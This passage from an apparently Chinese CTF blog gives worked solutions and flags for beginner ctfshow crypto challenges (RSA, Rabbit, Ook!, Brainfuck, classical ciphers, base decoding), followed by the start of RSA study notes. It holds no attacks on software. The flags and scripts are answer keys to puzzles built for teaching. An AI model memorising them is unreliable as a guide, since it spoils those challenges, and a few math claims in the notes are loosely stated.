class="language-none">flag&#123;53616899001&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307 q&#x3D;2037 e&#x3D;17 c&#x3D;704796792提交flag&#123;m&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">447685307</span>q <span class="token operator">=</span> <span class="token number">2037</span>e <span class="token operator">=</span> <span class="token number">17</span>c <span class="token operator">=</span> <span class="token number">704796792</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;904332399012&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto6"><a href="#crypto6" class="headerlink" title="crypto6"></a>crypto6</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">密钥为 加密方式 名称，区分大小写crypto6.txt密文：U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+密钥：加密方式名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Rabbit：<a href="http://www.jsons.cn/rabbitencrypt/">http://www.jsons.cn/rabbitencrypt/</a></p><p><img src="https://s3.ax1x.com/2021/02/16/ygpR0K.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;a8db1d82db78ed452ba0882fb9554fc9&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h3><p>题目：crypto7</p><p>Ook!：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p><img src="https://s3.ax1x.com/2021/02/16/ygphkD.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;b615c4b79a1aede83b9ae67104ff4eb5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h3><p>题目：crypto8.txt</p><p>Brainfuck：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p><img src="https://s3.ax1x.com/2021/02/16/ygpWTO.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;99754106633f94d350db34d548d6091a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h3><p>网站打不开：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p><p><img src="https://s3.ax1x.com/2021/02/16/ygp76I.png"></p><br><h3 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">解密后 提交 flag&#123;明文&#125;crypto10.txt&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>quoted-printable编码：<a href="http://web.chacuo.net/charsetquotedprintable">http://web.chacuo.net/charsetquotedprintable</a></p><p><img src="https://s3.ax1x.com/2021/02/16/ygpT1A.png"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;用你那火热的嘴唇让我在午夜里无尽的销魂&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">密文：a8db1d82db78ed452ba0882fb9554fc提交 flag&#123;明文&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>md5解密：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;ctf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">gmbh&#123;ifmmp_dug&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>凯撒密码：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p>位移：1</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;hello_ctf&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto12"><a href="#crypto12" class="headerlink" title="crypto12"></a>crypto12</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">uozt&#123;Zgyzhv_xlwv_uiln_xguhsld&#125;不用看了，没提示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>埃特巴什码（Atbash Cipher）：<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</a></p><p>埃特巴什码：使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。</p><p><img src="https://s3.ax1x.com/2021/02/16/ygpopd.png"></p><p>将小写的<code>a</code>改为<code>A</code></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Atbase_code_from_ctfshow&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q6qAdororzP0H7aIkoY1rg 提取码：7mjw 格式flag&#123;*****&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本：来自：<a href="https://blog.csdn.net/i_kei/article/details/110086135">https://blog.csdn.net/i_kei/article/details/110086135</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'base.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>src <span class="token operator">=</span> s<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        src <span class="token operator">=</span> s        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b16decode<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        src <span class="token operator">=</span> s        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b32decode<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        src <span class="token operator">=</span> s        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">break</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'result.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decryption complete!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;b4Se_Fami1y_Is_FUn&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="crypto14"><a href="#crypto14" class="headerlink" title="crypto14"></a>crypto14</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">00110011 00110011 00100000 00110100 00110101 00100000 00110101 00110000 00100000 00110010 01100110 00100000 00110011 00110011 00100000 00110101 00110110 00100000 00110100 01100101 00100000 00110100 00110110 00100000 00110100 00110110 00100000 00110110 01100100 00100000 00110100 01100101 00100000 00110100 00110101 00100000 00110100 00110001 00100000 00110110 01100101 00100000 00110110 01100011 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110100 00100000 00110100 00110011 00100000 00110100 01100100 00100000 00110110 01100100 00100000 00110101 00110110 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110001 00100000 00110110 00110100 00100000 00110011 00111001 00100000 00110111 00110101 00100000 00110100 00110111 00100000 00110000 01100001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原理参考这篇文章：<a href="https://blog.csdn.net/miuzzx/article/details/104495832">https://blog.csdn.net/miuzzx/article/details/104495832</a></p><p>用php写个脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"00110011 00110011 00100000 00110100 00110101 00100000 00110101 00110000 00100000 00110010 01100110 00100000 00110011 00110011 00100000 00110101 00110110 00100000 00110100 01100101 00100000 00110100 00110110 00100000 00110100 00110110 00100000 00110110 01100100 00100000 00110100 01100101 00100000 00110100 00110101 00100000 00110100 00110001 00100000 00110110 01100101 00100000 00110110 01100011 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110100 00100000 00110100 00110011 00100000 00110100 01100100 00100000 00110110 01100100 00100000 00110101 00110110 00100000 00110100 00111000 00100000 00110100 00110100 00100000 00110011 00110101 00100000 00110110 00110001 00100000 00110110 00110100 00100000 00110011 00111001 00100000 00110111 00110101 00100000 00110100 00110111 00100000 00110000 01100001"</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%08d"</span><span class="token punctuation">,</span> <span class="token function">decbin</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">30</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token punctuation">[</span><span class="token variable">$num</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;看我长不长?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="萌新-密码5"><a href="#萌新-密码5" class="headerlink" title="萌新_密码5"></a>萌新_密码5</h3><p>题目：</p><pre class="line-numbers language-none"><code class="language-none">由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当铺密码：汉字有多少笔画出头，就是转化成数字几。</p><p>如：<code>由</code>=1，<code>中</code>=2</p><p>根据题目用php写个脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"由田中 由田井 羊夫 由田人 由中人 羊羊 由由王 由田中 由由大 由田工 由由由 由由羊 由中大"</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"田"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"由"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"中"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"人"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"工"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"4"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"大"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"5"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"王"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"夫"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"7"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"井"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"8"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"羊"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"9"</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;ctfshow&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h3 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h3><p>题目：babyrsa.txt</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span>q <span class="token operator">=</span> <span class="token number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span>c <span class="token operator">=</span> <span class="token number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">flag&#123;b4by_R5A&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习笔记——RSA</title>
      <link href="posts/20210215.html"/>
      <url>posts/20210215.html</url>
      
        <content type="html"><![CDATA[<p>RSA算法学习笔记 &amp; 3道crypto题目</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>RSA算法（RSA algorithm）是1977年由Ron <strong>R</strong>ivest、Adi <strong>S</strong>hamir和Leonard <strong>A</strong>dleman一起提出的，RSA就是他们三人姓氏开头字母拼在一起组成的。</p><p>RSA算法首先生成两把密钥（公钥和私钥），公钥对外公布，私钥由用户自己保管。信息传输过程大致如：<code>A</code>利用RSA算法生成两把密钥后，将公钥公开、私钥自己保管，<code>B</code>用公钥加密信息生成密文，<code>A</code>再用私钥对密文进行解密。</p><br><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><h3 id="质数-amp-互质"><a href="#质数-amp-互质" class="headerlink" title="质数 &amp; 互质"></a>质数 &amp; 互质</h3><ul><li>质数：除了1和它本身之外不再有其它因数的自然数。</li><li>互质：公因数只有1的两个自然数称为互质自然数，即这两个自然数互质。</li></ul><p>像<code>4</code>和<code>5</code>两个自然数，它们的公因数只有<code>1</code>，所以<code>4</code>和<code>5</code>互质。</p><p>而<code>6</code>和<code>8</code>的公因数除了<code>1</code>之外还有<code>2</code>，所以它们不是互质自然数。</p><p>而<code>5</code>和<code>5</code>的公因数有<code>1</code>和<code>5</code>，所以也不是互质自然数。</p><ul><li>两个不同的质数一定是互质数。</li><li>相邻的两个自然数是互质数。</li><li>较大数是质数的两个数是互质数。</li></ul><br><h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>欧拉函数（Euler’s totient function）是指对于对于正整数n，小于或等于n的正整数中与n互质的数的个数。</p><p>比如对于φ(6)，小于或等于6的正整数有<code>1、2、3、4、5、6</code>，其中与<code>6</code>互质的有<code>1、5</code>，所以φ(6) = 2</p><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><ul><li>对于一个质数n，φ(n) = n-1</li></ul><blockquote><p>即对于质数7，φ(7) = 7-1 = 6</p></blockquote><ul><li>对于一个数，如果能分解为两个互质的数，即n=p*q，那么φ(n) = φ(p*q) = φ(p) * φ(q)</li></ul><blockquote><p>即对于数20，φ(20) = φ(4*5) = φ(4) * φ(5)</p></blockquote><p>由两个性质可得：对于一个数n，如果能够分解为两个<strong>互质</strong>的<strong>质数</strong>(p和q)，那么φ(n) = φ(p*q) = φ(p) * φ(q) = (p-1) * (q-1)</p><p>所以φ(35) = φ(5*7) = φ(5) * φ(7) = (5-1) * (7-1) = 4*6 = 24</p><br><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>对于两个互质的正整数m和n，有<br>$$<br>m^{\varphi(n)} \equiv 1\pmod{n}<br>$$<br>也就是说，m的φ(n)次方除以n的余数为1。</p><p>在这里我们对它做一些变化，先两边同时乘以一个任意的正整数幂k，可得：<br>$$<br>(m^{\varphi(n)})^k \equiv 1^k\pmod{n}<br>$$</p><p>$$<br>m^{k\varphi(n)} \equiv 1\pmod{n}<br>$$</p><p>两边再同时乘以正整数m，可得：<br>$$<br>m^{k\varphi(n)} * m \equiv 1*m \pmod{n}<br>$$</p><p>$$<br>m^{k\varphi(n)+1} \equiv m \pmod{n}<br>$$</p><p>$$<br>m^{k\varphi(n)+1} \mod{n} \equiv m<br>$$</p><br><h3 id="模反元素"><a href="#模反元素" class="headerlink" title="模反元素"></a>模反元素</h3><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a对模数n的<strong>模反元素</strong>。<br>$$<br>ab \equiv 1 \pmod{n}<br>$$<br>代入定义来理解：对于两个互质的正整数a=3和n=11，存在一个数b=4，使得3*4除以11的余数为1。</p><p>显然b不只有1个，可以有很多个，即存在一个整数k，使得<code>a*kb mod n = 1</code>，即：<code>3*k*4 mod 11 = 1</code>，或<code>3*4-1 = kφ(n)</code>。</p><br><h2 id="编程基础"><a href="#编程基础" class="headerlink" title="编程基础"></a>编程基础</h2><h3 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h3><p>gmpy2是一个Python扩展模块，是对GMP (Multiple Precision Arithmetic 